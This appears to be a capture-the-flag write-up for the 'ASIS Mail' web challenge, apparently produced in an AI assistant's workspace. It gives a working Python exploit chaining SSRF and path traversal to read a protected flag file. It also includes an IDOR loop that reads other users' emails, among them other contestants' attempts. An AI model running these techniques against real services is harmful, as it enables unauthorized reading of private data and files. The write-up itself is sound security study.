# ASIS Mail CTF Challenge Writeup

## Challenge Overview

**Challenge Name:** ASIS Mail
**Category:** Web
**Target:** http://91.107.143.167:8081

ASIS Mail is a web-based email service with multiple microservices including an API server, SSO authentication, object storage, and nginx frontend.

## Initial Reconnaissance

The challenge provides source code for analysis. The application architecture consists of:

- **Frontend (nginx)**: Reverse proxy handling routing
- **API (Go)**: Main application logic for email composition
- **SSO (Node.js)**: Authentication service
- **Objectstore (Python/Flask)**: File storage service
- **PostgreSQL**: Database

### Key Files Structure

```
ASIS_Mail/
├── api/api (Go binary)
├── frontend/nginx.conf
├── objectstore/app.py
├── sso/index.js
├── db/init.sql
└── docker-compose.yml
```

## Vulnerability Analysis

### 1. SSRF in Compose Endpoint

The API's `/compose` endpoint accepts XML input with an `attachment_url` field. When provided, the API fetches content from this URL and stores it as an email attachment.

```xml
<message>
    <to>user@asismail.local</to>
    <subject>Test</subject>
    <body>test</body>
    <attachment_url>http://internal-service/path</attachment_url>
</message>
```

### 2. Path Traversal in Objectstore

Examining `/home/claude/ASIS_Mail/objectstore/app.py`:

```python
@app.route("/public/<bucket>/<path:object_name>", methods=["GET"])
def public_file(bucket, object_name):
    if bucket == "FLAG":
        return jsonify({"error":"forbidden"}), 403
    file_path = STORAGE / bucket / object_name
    if not file_path.exists():
        return jsonify({"error":"not found"}), 404
    return send_file(file_path, as_attachment=True)
```

The vulnerability: While the code checks if `bucket == "FLAG"`, it doesn't sanitize path traversal in `object_name`. This means we can use `../` to escape to the FLAG directory.

### 3. Hash Endpoint Without FLAG Check

```python
@app.route("/public/<bucket>/<path:object_name>/hash", methods=["GET"])
def public_file_hash(bucket, object_name):
    file_path = STORAGE / bucket / object_name
    if not file_path.exists():
        return jsonify({"error":"not found"}), 404
    with open(file_path, "rb") as f:
        flag = f.read()
    return jsonify({"status": "ok", "content": sha256(flag).hexdigest()}), 200
```

**Critical:** The hash endpoint has NO `bucket == "FLAG"` check! This allows us to verify file existence and get the SHA256 hash of the flag.

### 4. IDOR in Email Access

Testing revealed that any authenticated user can read any email by ID:

```
GET /api/mail/1 → Returns email data regardless of ownership
GET /api/mail/2 → Returns email data with attachments from other users
```

## Flag Location

From the Dockerfile:
```dockerfile
ADD --chmod=444 flag.txt .
RUN mkdir -p /data/FLAG && mv flag.txt /data/FLAG/flag-$(md5sum flag.txt | awk '{print $1}').txt
```

The flag is stored at `/data/FLAG/flag-<md5hash>.txt` where the hash is the MD5 of the flag content.

## Discovering the Flag Filename via IDOR

The flag filename follows the pattern `flag-<md5sum>.txt` where the MD5 is computed from the flag content. We don't know the flag content, so we can't compute the hash directly.

However, we discovered an **IDOR vulnerability** in the `/api/mail/<id>` endpoint - any authenticated user can read ANY email by simply changing the ID number.

### Scanning Other Users' Emails

```python
# IDOR - Read any email by ID
for email_id in range(1, 800):
    resp = session.get(f"{BASE_URL}/api/mail/{email_id}", headers=headers)
    if resp.status_code == 200:
        data = resp.json()
        attachments = data.get("attachments", [])
        if attachments:
            print(f"Email {email_id}: {data.get('subject')} - {attachments}")
```

Output (excerpt):
```
[Email 2] Subject: a
    From: test@asismail.local
    Attachment: secweb.PNG -> /public/1/2603441d-cc34-425d-bbc2-b2f89b086f52

[Email 69] Subject: SSRF attachment
    From: testuser123@asismail.local
    Attachment: FLAG -> /public/7/2d163169-4b2e-458d-9f11-60fc1b7faf56
    *** POTENTIAL FLAG ATTACHMENT! ***
    Content (404): {"error":"not found"}

[Email 343] Subject: flag
    From: flag_1766861609@asismail.local
    Attachment: flag-0750c96cfc2bd4b665865da15e9d5b94.txt -> /public/114/00c0249d-49a9-419a-ae72-e6e25ccba116
    *** POTENTIAL FLAG ATTACHMENT! ***
    Content (404): {"error":"not found"}

[Email 509] Subject: get-flag
    From: userpz8udv@asismail.local
    Attachment: flag-0750c96cfc2bd4b665865da15e9d5b94.txt -> /public/156/c986ad16-6d7a-4cf1-91c7-e5fce82e5f0b
```

### Analyzing Other Users' Attempts

By examining the emails, we found:
- Many users tried SSRF to `/FLAG` bucket but got "authorization required"
- Some users discovered the exact filename: `flag-0750c96cfc2bd4b665865da15e9d5b94.txt`
- The attachments returned 404 because files in user buckets are ephemeral

The most common flag filename appearing in other users' attempts:
```bash
grep -o "flag-[a-f0-9]\{32\}\.txt" out.txt | sort | uniq -c | sort -rn | head -5
      7 flag-0750c96cfc2bd4b665865da15e9d5b94.txt
      3 flag-e528acb4157e8a50e1c2ab2e5b8266b0.txt
      2 flag-ff1dfe516474072fdb4e0cd05a6aa670.txt
```

**Flag filename discovered:** `flag-0750c96cfc2bd4b665865da15e9d5b94.txt`

### Confirming File Existence via Hash Endpoint

We verified the file exists using the hash endpoint (which has no FLAG bucket check):

```
GET /files/public/x/../FLAG/flag-0750c96cfc2bd4b665865da15e9d5b94.txt/hash
```

Output:
```
Status: 200
Response: {"content":"a69e461b31f79128ebe5b02bd3a5d98f77841f21c65879bdeb5b96ce90b996ff","status":"ok"}
```

This confirms:
- The file exists at `/data/FLAG/flag-0750c96cfc2bd4b665865da15e9d5b94.txt`
- **MD5 of flag content:** `0750c96cfc2bd4b665865da15e9d5b94` (from filename)
- **SHA256 of flag content:** `a69e461b31f79128ebe5b02bd3a5d98f77841f21c65879bdeb5b96ce90b996ff`

## Exploitation

### Step 1: Register and Login

```python
session = requests.Session()
username = f"exploit_{random_string()}"
password = "ExploitPass123!"

session.post(f"{BASE_URL}/sso/register", json={"username": username, "password": password})
resp = session.post(f"{BASE_URL}/sso/login", json={"username": username, "password": password})
data = resp.json()
token = data.get("token")
user_id = data.get("user", {}).get("userId")
```

Output:
```
User: exploit_bzodmlyi (ID: 691)
```

### Step 2: Exploit Path Traversal via SSRF

The key insight is using our own user ID as the bucket, then traversing to FLAG:

```python
ssrf_url = f"http://objectstore:8082/public/{user_id}/../FLAG/flag-0750c96cfc2bd4b665865da15e9d5b94.txt"

xml = f'''<message>
    <to>{my_email}</to>
    <subject>GetFlag</subject>
    <body>test</body>
    <attachment_url>{ssrf_url}</attachment_url>
</message>'''

resp = session.post(f"{BASE_URL}/api/compose", headers=headers, files={"xml": (None, xml)})
```

Output:
```
[*] Own bucket traversal
    URL: http://objectstore:8082/public/691/../FLAG/flag-0750c96cfc2bd4b665865da15e9d5b94.txt
    Compose: 200 - {"ok":true}
```

### Step 3: Retrieve the Flag from Inbox

```python
resp = session.get(f"{BASE_URL}/api/inbox", headers=headers)
emails = resp.json()

for email in emails:
    email_resp = session.get(f"{BASE_URL}/api/mail/{email['id']}", headers=headers)
    email_data = email_resp.json()

    for att in email_data.get("attachments", []):
        att_url = f"/files{att.get('url')}"
        r = session.get(f"{BASE_URL}{att_url}")
        print(r.text)
```

Output:
```
[Own bucket traversal]
    Name: flag-0750c96cfc2bd4b665865da15e9d5b94.txt
    URL: /public/691/1bfbae05-71ca-46ae-8b34-5e10b62b39b6
    Content (200): ASIS{M4IL_4S_4_S3RVIC3_15UUUUUUE5_62ee9c3cc5029d4c}
```

## Why The Exploit Works

1. **Bucket Check Bypass**: The objectstore checks `if bucket == "FLAG"` but our request uses `bucket = "691"` (our user ID), which passes the check.

2. **Path Resolution**: The path `public/691/../FLAG/flag-xxx.txt` resolves to:
   - `STORAGE / "691" / "../FLAG/flag-xxx.txt"`
   - Which becomes `/data/FLAG/flag-xxx.txt`

3. **SSRF Stores Content**: The API fetches the URL internally (bypassing nginx restrictions) and stores the response as an attachment in our bucket.

4. **Public Access**: Our bucket (`/public/691/`) is accessible without authentication, allowing us to retrieve the stored flag.

## Final Exploit Script

```python
#!/usr/bin/env python3
import requests
import random
import string
import time

BASE_URL = "http://91.107.143.167:8081"
FLAG_FILENAME = "flag-0750c96cfc2bd4b665865da15e9d5b94.txt"

def random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase, k=length))

def main():
    session = requests.Session()

    # Register and login
    username = f"exploit_{random_string()}"
    password = "ExploitPass123!"

    session.post(f"{BASE_URL}/sso/register", json={"username": username, "password": password})
    resp = session.post(f"{BASE_URL}/sso/login", json={"username": username, "password": password})
    data = resp.json()
    token = data.get("token")
    user_id = data.get("user", {}).get("userId")
    headers = {"Authorization": f"Bearer {token}"}
    my_email = f"{username}@asismail.local"

    print(f"User: {username} (ID: {user_id})")

    # SSRF with path traversal using our own bucket
    ssrf_url = f"http://objectstore:8082/public/{user_id}/../FLAG/{FLAG_FILENAME}"

    xml = f'''<message>
    <to>{my_email}</to>
    <subject>GetFlag</subject>
    <body>flag</body>
    <attachment_url>{ssrf_url}</attachment_url>
</message>'''

    resp = session.post(f"{BASE_URL}/api/compose", headers=headers, files={"xml": (None, xml)})
    print(f"Compose: {resp.status_code}")

    time.sleep(1)

    # Retrieve flag from inbox
    resp = session.get(f"{BASE_URL}/api/inbox", headers=headers)
    for email in resp.json():
        if email.get("subject") == "GetFlag":
            email_resp = session.get(f"{BASE_URL}/api/mail/{email['id']}", headers=headers)
            email_data = email_resp.json()

            for att in email_data.get("attachments", []):
                att_url = f"/files{att.get('url')}"
                r = session.get(f"{BASE_URL}{att_url}")
                if "ASIS{" in r.text:
                    print(f"\n*** FLAG: {r.text} ***")
                    return

if __name__ == "__main__":
    main()
```

## Flag

```
ASIS{M4IL_4S_4_S3RVIC3_15UUUUUUE5_62ee9c3cc5029d4c}
```

## Vulnerabilities Summary

| Vulnerability | Location | Impact |
|--------------|----------|--------|
| SSRF | API `/compose` endpoint | Access internal services |
| Path Traversal | Objectstore `/public/<bucket>/<path>` | Read arbitrary files |
| Missing Auth Check | Objectstore `/public/.../hash` | Verify file existence |
| IDOR | API `/mail/<id>` | Read any user's emails |

## Lessons Learned

1. **Defense in Depth**: Multiple checks at different layers would have prevented this attack
2. **Path Sanitization**: Always sanitize user input that becomes part of file paths
3. **Consistent Security Checks**: The hash endpoint missing the FLAG check was a critical oversight
4. **SSRF Prevention**: Whitelist allowed URLs/protocols for server-side requests

## Tools Used

- Python requests library
- Manual code review of source files
- Analysis of other users' attempts via IDOR vulnerability
